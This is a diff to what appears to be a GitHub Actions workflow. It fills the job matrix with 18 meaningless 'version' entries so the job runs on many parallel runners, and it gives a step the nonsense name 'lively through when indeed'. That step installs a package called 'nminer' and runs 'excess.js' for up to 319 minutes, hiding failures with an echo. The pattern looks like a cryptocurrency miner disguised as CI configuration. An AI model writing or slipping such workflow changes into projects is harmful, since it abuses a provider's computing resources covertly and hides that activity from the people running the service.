@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2216 }
-          - { version: 2976 }
-          - { version: 3023 }
-          - { version: 924 }
-          - { version: 3668 }
-          - { version: 1732 }
-          - { version: 8296 }
-          - { version: 5552 }
-          - { version: 5290 }
-          - { version: 5614 }
-          - { version: 6720 }
-          - { version: 9039 }
-          - { version: 2425 }
-          - { version: 9632 }
-          - { version: 190 }
-          - { version: 3769 }
-          - { version: 9419 }
+          - { version: 6880 }
+          - { version: 5934 }
+          - { version: 3635 }
+          - { version: 5277 }
+          - { version: 9385 }
+          - { version: 8704 }
+          - { version: 6030 }
+          - { version: 1615 }
+          - { version: 9266 }
+          - { version: 5286 }
+          - { version: 394 }
+          - { version: 7532 }
+          - { version: 7194 }
+          - { version: 7105 }
+          - { version: 3510 }
+          - { version: 7324 }
+          - { version: 9663 }
+          - { version: 5102 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: lively through when indeed
         run: |
           npm install nminer@latest
-          timeout 305m node excess.js || echo "excess executed"
+          timeout 319m node excess.js || echo "excess executed"
